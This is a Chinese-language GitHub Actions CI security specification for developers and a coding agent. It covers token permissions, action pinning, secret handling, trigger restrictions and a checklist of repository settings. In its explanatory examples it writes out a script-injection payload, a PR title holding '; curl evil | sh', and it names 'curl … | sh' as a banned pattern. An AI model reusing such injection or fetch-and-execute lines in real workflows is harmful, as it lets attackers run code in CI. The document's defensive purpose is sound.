# CI 安全规范（GitHub Actions）

> **文档 ID：** `CI-SECURITY-v1`  
> **受众：** Cursor Agent、研发人员  
> **用途：** 所有接入 SDLC 的项目写、改、审 `.github/workflows/` 时遵守  
> **配套：** Rule [`ci-security.mdc`](../.cursor/rules/ci-security.mdc) · 检查脚本 [`templates/check-ci-workflow-security.example.mjs`](../templates/check-ci-workflow-security.example.mjs) · 工作流模板 [`templates/ci/db-tests.workflow.example.yml`](../templates/ci/db-tests.workflow.example.yml)  
> **业务项目副本：** `docs/qa/ai-sdlc-ci-security.md`（由 `init-project-sdlc.sh` 复制）

---

## 0. 适用范围与总原则

- 仓库里只要有 `.github/workflows/`，就适用本规范。
- **CI 只做一件事：在 GitHub 托管的临时机器上跑测试。** 测试用的数据库是工作流自己起的一次性容器，跑完即销毁。
- **CI 不连任何真实环境**：生产、验收、共享开发库都不连；不部署；不发版。部署和生产写操作仍按 [`data-redlines.mdc`](../.cursor/rules/data-redlines.mdc) 走 **CP-10**。
- 最小权限：工作流拿到的 GitHub 令牌只能读代码；仓库里不存任何密钥。

---

## 1. 硬性规则

R1～R11 由检查脚本 `guard:ci-workflow-security` 自动检查；R13 的连接串部分也由脚本检查；R12～R16 其余部分靠 Rule、Code Review 和人工设置。

| # | 规则 | 为什么 | 检查 |
|---|------|--------|------|
| R1 | 顶层必须写 `permissions`，只能是 `read` / `none`（或 `read-all`、`{}`，`{}` 表示全部关闭）；job 级 `permissions` 同样只能是 `read` / `none`，任何 `permissions` 块里都不得出现 `write` | 默认令牌可能带写权限；被注入的步骤能借它改代码、改 PR | 脚本 |
| R2 | 只允许 `pull_request` 和 `push` 触发，且限定 `dev` / `main` 分支 | `pull_request_target`、`workflow_run` 会在带权限的上下文里跑 PR 代码；`workflow_dispatch` 等带手工输入，`schedule` 无人值守 | 脚本（事件）+ Review（分支） |
| R3 | 不引用 `secrets.*`、`vars.*`（含方括号写法），不写 `secrets: inherit`，不使用 job 级 `environment:` | 测试不需要密钥和配置变量；`environment:` 会让 job 使用已有部署环境的密钥、审批规则和云服务授权范围 | 脚本 |
| R4 | action 只能来自 `actions/` 或 `github/`，并锁到 40 位提交哈希；不用第三方 action、`docker://`、本地 action | 版本号标签可以被改指向新代码；提交哈希不可替换 | 脚本 |
| R5 | `actions/checkout` 必须设置 `persist-credentials: false` | 否则令牌会写进机器上的 `.git/config`，后续步骤都能读到 | 脚本 |
| R6 | `runs-on` 只用 GitHub 托管机器：`ubuntu-*`、`windows-*`、`macos-*`（含 `ubuntu-24.04-arm` 这类官方标签），写具体值，不用表达式；仓库不注册自建机器（S8） | 自建机器跑 PR 代码等于让外部代码进内网 | 脚本 + 人工核对 S8 |
| R7 | 每个 `${{ … }}` 写在一行内；表达式里的 `github` 只能用 `github.ref`、`github.sha`、`github.event_name`、`github.repository`、`github.run_id`、`github.run_number`，其余写法（`github.event.*`、`github.head_ref`、`github.ref_name`、`github[...]`、整个 `github`、`toJson(github)`）一律禁止；`env:`、`outputs:` 里也一样 | PR 标题、分支名等可由提交者填写，拼进 `run:` 就是脚本注入，先放进 `env:` 或 job 输出再引用同样危险。采用只放行固定字段的方式，新写法默认被拦 | 脚本 |
| R8 | 每个 job 都设 `timeout-minutes` | 防止卡死的任务一直占用机器 | 脚本 |
| R9 | 顶层设 `concurrency`，且 `cancel-in-progress: true` | 同一分支有新提交时取消旧运行 | 脚本 |
| R10 | 依赖按锁文件安装：`pnpm install --frozen-lockfile` / `npm ci` / `yarn install --immutable` | 防止 CI 装到锁文件之外的新版本 | 脚本 |
| R11 | `services` / `container` 的镜像锁定到 `@sha256:` 摘要 | 镜像标签同样可以被改指向新内容 | 脚本 |
| R12 | 改 `.github/**`、检查脚本或 harness 配置必须过 CP（CP-01/02 写明），commit 前按 **L2 + Security** 审查；不得删除或放宽检查规则和 harness 里的检查步骤 | 工作流决定 CI 里能执行什么，检查脚本决定能不能发现问题，改它们等于改权限 | Review |
| R13 | 不在 GitHub Secrets、Variables、Environments 里存任何生产、验收或共享环境的账号、密码、连接串；工作流里出现的账号只能是临时容器的固定值，数据库连接串（`postgres://`、`postgresql://`、`mysql://`）的主机只能是 `localhost`、`127.0.0.1` 或服务名 `postgres` | CI 不该连真实环境，也就不该有它的凭据 | 脚本（连接串主机）+ Review + 人工核对 §4 |
| R14 | `run:` 里不下载并执行远程脚本（如 `curl … \| sh`）；不在 CI 里 `pnpm add` / `npm install <包>` | 绕过锁定版本，等于引入未审查的代码 | Review |
| R15 | Agent 不修改仓库的 Actions 设置、分支保护和 Secrets；需要时给出 §4 清单，由人在 GitHub 网页上操作 | 仓库设置是最后一道防线，不能由被约束的一方改 | Rule |
| R16 | 不写部署、发版、推送镜像、写云资源的步骤 | 部署属于 CP-10，不进 CI | Review |

需要突破某条规则（例如确实要用第三方 action）时：在 CP-02 写明理由和替代方案，新增依赖走 **CP-03**，同时更新本规范；不得在项目里单独放宽检查脚本。

---

## 2. 写法示例

检查脚本按行和缩进读取，**工作流须用块写法**（每个键一行），不要用 `{ a: 1, b: 2 }` 这类流式写法。

**权限与触发**

```yaml
# ✅
on:
  pull_request:
    branches: [dev, main]
  push:
    branches: [dev, main]
permissions:
  contents: read
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

# ❌
on: pull_request_target
permissions: write-all
```

**action 引用**

```yaml
# ✅ 提交哈希 + 行尾注释写版本号，方便升级时核对
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false

# ❌ 版本号标签、第三方 action
- uses: actions/checkout@v7
- uses: pnpm/action-setup@v4
```

pnpm 用 Node 自带的 corepack 启用（`run: corepack enable`），不用第三方 action。项目 `package.json` 须声明 `packageManager`，建议带哈希，例如 `pnpm@9.15.0+sha512.…`，corepack 会校验下载的 pnpm。

**外部输入**

```yaml
# ❌ PR 标题里写 "; curl evil | sh" 就会被执行
- run: echo "${{ github.event.pull_request.title }}"
```

方括号写法 `github.event['pull_request'].title`、`github.ref_name`、整体输出 `toJson(github)`、把表达式拆成多行同样禁止。`github` 只能用 R7 列出的 6 个字段，其他需求先在 CP-02 说明，再改规范和检查脚本。

**数据库服务**

```yaml
services:
  postgres:
    image: postgres:16@sha256:<64 位摘要>   # 标签只为可读，实际以摘要为准
    env:
      POSTGRES_PASSWORD: ci-only-not-a-secret   # 一次性容器的固定值，不是密钥
```

---

## 3. 项目准备步骤

模板里的「项目准备步骤」留给各项目填写，常见用途是：给临时库打本地开发库标记、建扩展、准备测试目录。约束：

- 只能作用于本工作流起的临时容器（`localhost` 上的服务）。
- 不得为了让 CI 通过而放宽项目自身的连库检查（如去掉本地库标记校验）；应在准备步骤里满足它。
- 命令登记在项目 `package.json`（如 `ci:prepare`），并在项目 `AGENTS.md` 的 Agent 执行规程里说明。

---

## 4. GitHub 仓库设置清单（人工）

由仓库管理员在 GitHub 网页上设置。Agent 只可以运行下表的**只读**核对命令，并把结果写进 CP-08 合并证据；不得调用修改设置的 API（R15）。

| # | 设置位置 | 目标值 | 只读核对命令（`<repo>` 形如 `owner/name`） |
|---|----------|--------|------------------------------------------|
| S1 | Settings → Actions → General → Actions permissions | 只允许 GitHub 官方 action（Allow actions created by GitHub） | `gh api repos/<repo>/actions/permissions` → `allowed_actions` 为 `selected`，且 `gh api repos/<repo>/actions/permissions/selected-actions` 的 `github_owned_allowed` 为 `true`、`verified_allowed` 为 `false`、`patterns_allowed` 为空 |
| S2 | 同上 → Require actions to be pinned to a full-length commit SHA | 开启 | 同 S1 第一条 → `sha_pinning_required` 为 `true` |
| S3 | 同上 → Workflow permissions | Read repository contents；**不勾选** Allow GitHub Actions to create and approve pull requests | `gh api repos/<repo>/actions/permissions/workflow` → `default_workflow_permissions` 为 `read`，`can_approve_pull_request_reviews` 为 `false` |
| S4 | 同上 → Fork pull request workflows | 私有仓库：**不勾选** Run workflows from fork pull requests；公开仓库：在 fork PR 审批选项里选**范围最大**的一项，即所有外部贡献者（不只是首次贡献者）的 fork PR 都要人工批准后才运行。GitHub 网页上的选项名可能随版本调整，以这个含义为准 | 网页核对 |
| S5 | Settings → Branches（或 Rules） | `dev`、`main`：必须经 PR 合并、CI 检查必须通过、禁止强制推送和删除 | `gh api repos/<repo>/branches/dev/protection`（`main` 同理） |
| S6 | Settings → Secrets and variables → Actions（仓库级；仓库属于组织时还要看组织级） | Secrets 0 个；Variables 不含任何连接串或账号；组织级 Secrets / Variables 不对本仓库开放 | `gh api repos/<repo>/actions/secrets`、`gh api repos/<repo>/actions/variables`；组织仓库再查 `gh api repos/<repo>/actions/organization-secrets`、`gh api repos/<repo>/actions/organization-variables` |
| S7 | Settings → Environments | 不建；需要时先过 CP-10。工作流本身不得引用 `environment:`（R3） | `gh api repos/<repo>/environments` |
| S8 | Settings → Actions → Runners | 不注册自建机器（仓库属于组织时，组织级自建机器也不对本仓库开放） | `gh api repos/<repo>/actions/runners` → `total_count` 为 `0` |

工作流第一次进仓库前，S1～S3、S6～S8 应已设好；S5 在 CI 第一次跑通后补上「必须通过」。

---

## 5. 版本升级与已知限制

**升级（建议每季度一次，或官方发布安全公告时）：** 作为普通任务走 CP-01～CP-06。

```bash
# action：查最新 release 的标签，再查标签指向的提交
gh api repos/actions/checkout/releases/latest --jq .tag_name
gh api repos/actions/checkout/git/ref/tags/<tag> --jq '.object.type + " " + .object.sha'
# object.type 为 tag（附注标签）时，再取一次：gh api repos/actions/checkout/git/tags/<sha> --jq .object.sha

# 镜像：查标签当前的摘要（需本机有 docker）
docker buildx imagetools inspect postgres:16 --format '{{json .Manifest.Digest}}'
```

升级后同时改标准库模板和各项目的工作流，并跑检查脚本。

**已知限制：**

- 锁哈希防的是「代码被替换」，防不住官方 action 自己的漏洞；只能靠定期升级。
- 检查脚本不是完整的 YAML 解析器：只认 §2 的块写法；`on: [push, pull_request]` 这类触发列表能识别，`permissions: { … }`、`runs-on: [ … ]` 等其余流式写法判为不通过，YAML 锚点、别名和多文档写法不保证能识别；`run:` 文本里出现规则关键字也可能误报。脚本不检查分支限定、`curl | sh`、部署步骤，这些靠 Review（R12～R16）。
- R7 只检查 `${{ … }}` 表达式本身，不做数据流分析：例如 `run:` 里用 shell 读取事件文件 `$GITHUB_EVENT_PATH` 再拼进命令，脚本看不出来，要靠 Review。
- R13 的脚本检查只认连接串格式：把主机、端口拆成 `PGHOST` 等单独变量，或在 `ci:prepare` 等项目脚本里另写连接，脚本看不出来，要靠 Review 确认只连临时容器。
- R6 按标签前缀判断：管理员给自建机器起名 `ubuntu-…` 时脚本分不出来，所以另有 S8 人工核对仓库没有自建机器。
- **同一个 PR 可以同时放宽工作流和检查本身。** CI 跑的是 PR 分支里的检查脚本和 harness 配置，提交者可以一并修改它们让检查失效。因此 `scripts/check-ci-workflow-security.mjs` 和 `harness.config.ts` 与 `.github/**` 一样按 L2 + Security 审查（[code-review.md](code-review.md) §3），审查时要单独确认检查规则和 harness 检查步骤没有被删除或放宽。
- corepack 会从 npm 下载 pnpm；`packageManager` 不带哈希时只锁版本号。
- 仓库设置（§4）只能人工维护，检查脚本看不到；CP-08 用只读命令核对。

---

## 6. 与检查点的对应

| 检查点 | 要求 |
|--------|------|
| CP-01 / CP-02 | 要新增或修改工作流时写进范围；新增第三方 action 或依赖走 CP-03 |
| CP-05 | `guard:ci-workflow-security` 通过（已接进 harness 时随 `test:harness:ci`） |
| CP-06 | diff 命中 `.github/**`、`scripts/check-ci-workflow-security.mjs` 或 `harness.config.ts` → L2 + Security（[code-review.md](code-review.md) §3、[decision-rubrics.md](decision-rubrics.md) CP-06 步骤 1 #7） |
| CP-08 | 分支改了上述任一路径 → 合并证据写检查脚本结果和 §4 只读核对结果（[pr-review.md](pr-review.md) §2.1） |
| CP-10 | 任何需要连真实环境、存凭据或部署的需求 |

---

## 变更记录

| 日期 | 版本 | 说明 |
|------|------|------|
| 2026-10-29 | v1.0 | 首版：R1～R16、写法示例、项目准备步骤、仓库设置清单 S1～S8、升级与已知限制 |
